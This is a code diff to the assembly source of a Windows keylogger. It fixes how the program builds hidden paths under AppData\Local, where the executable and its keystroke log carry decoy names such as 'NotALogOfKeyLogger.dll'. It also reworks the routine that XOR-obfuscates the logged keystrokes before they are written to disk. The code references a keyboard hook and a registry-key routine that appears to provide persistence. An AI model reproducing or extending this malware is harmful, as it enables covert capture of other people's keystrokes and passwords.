@@ -29,7 +29,7 @@ ClearFile PROTO
 
 ;~~~~~~~~~~~~~Globals~~~~~~~~~~~~~~~~~~~~
 .DATA
-exeLocationFirstPart db 'C:\Users\', 0
+envVariableDirectory db 'USERPROFILE', 0
 exeLocationSecondPart db '\AppData\Local\NotAKeyLogger.exe', 0
 logLocationSecondPart db '\AppData\Local\NotALogOfKeyLogger.dll', 0 
 processName db 'NotAKeyLogger.exe', 0
@@ -58,9 +58,9 @@ timeformat db "hh:mm:ss tt", 0
 
 ;~~~~~~~~~~~~~~~~~~BSS~~~~~~~~~~~~~~~~
 .DATA?
-userName db 32 dup (?)
-exeLocation db 100 dup (?)
-logLocation db 100 dup (?)
+userProfilePath db 100 dup (?)
+exeLocation db 255 dup (?)
+logLocation db 255 dup (?)
 hInstance dd ?
 hookInstance dd ?
 fileDescriptor HANDLE ?
@@ -138,14 +138,10 @@ CheckIfSameProcessExists ENDP
 ;**********************Sets Paths For Key Files, That Are Used By Program*****
 SetPathLocationsForFiles PROC
 
-		push				32
-		mov				esi, esp
-		INVOKE			GetUserName, ADDR userName, esi
-		pop				ecx
-		INVOKE			WriteByteByByteToBuffer, ADDR exeLocationFirstPart, ADDR userName, ADDR exeLocation			;C:\Users\ + username
-		INVOKE			WriteByteByByteToBuffer, ADDR exeLocation, ADDR exeLocationSecondPart, ADDR exeLocation	;previous + \AppData\Local\NotAKeyLogger.exe
-		INVOKE			WriteByteByByteToBuffer, ADDR exeLocationFirstPart, ADDR userName, ADDR logLocation			;C:\Users\ + username
-		INVOKE			WriteByteByByteToBuffer, ADDR logLocation, ADDR logLocationSecondPart, ADDR logLocation		;previous + \AppData\Local\NotAKeyLogger.dll
+		mov				ecx, 100 ;max size of buffer with path after getting env variable
+		INVOKE			GetEnvironmentVariable, ADDR envVariableDirectory, OFFSET userProfilePath, ecx
+		INVOKE			WriteByteByByteToBuffer, ADDR userProfilePath, ADDR exeLocationSecondPart, ADDR exeLocation	;%userprofile% + \AppData\Local\NotAKeyLogger.exe
+		INVOKE			WriteByteByByteToBuffer, ADDR userProfilePath, ADDR logLocationSecondPart, ADDR logLocation		;%userprofile% + \AppData\Local\NotAKeyLogger.dll
 		ret
 						
 SetPathLocationsForFiles ENDP
@@ -153,7 +149,7 @@ SetPathLocationsForFiles ENDP
 ;******************Make Or Open File***********************************
 MakeOrOpenFile PROC 
 
-		INVOKE			CreateFile, ADDR logLocation, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
+		INVOKE			CreateFile, OFFSET logLocation, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
 		mov				fileDescriptor, eax
 		ret
 
@@ -177,8 +173,8 @@ WriteLaunchTimeToFile PROC
 		add				ecx, eax
 		mov				BYTE PTR [ecx - 1], " "
 		INVOKE			GetTimeFormat, 0, 0, 0, ADDR timeformat, ecx, 20
-		lea				ecx, date_buf
-		INVOKE			WriteToFile, ecx
+		lea				edx, date_buf
+		INVOKE			WriteToFile, edx
 		lea				edx, newLine 
 		INVOKE			WriteToFile, edx
 		ret
@@ -259,7 +255,6 @@ CreateRegistryKey ENDP
 ;******************Write To File**************************************
 WriteToFile PROC msg:DWORD
 LOCAL	nBytes:DWORD
-LOCAL   encryptedString:DWORD
 
 		INVOKE		GetStringLength, msg
 		mov			esi, msg
@@ -267,14 +262,14 @@ LOCAL   encryptedString:DWORD
 
 Encrypt:
 		dec			ecx
-		movzx		eax, BYTE PTR [esi+ecx]
-		xor			eax, 50h
-		mov			[encryptedString+ecx], eax
+		mov			al, BYTE PTR [esi+ecx]
+		xor			al, 50h	;encrypt character with key (simple encryption)
+		mov			[esi+ecx], al
 		test			ecx, ecx
 		jne			Encrypt
 		
 		pop			ecx
-		INVOKE		WriteFile, fileDescriptor, ADDR encryptedString, ecx, ADDR nBytes, 0	
+		INVOKE		WriteFile, fileDescriptor, esi, ecx, ADDR nBytes, 0
 		ret
 
 WriteToFile ENDP
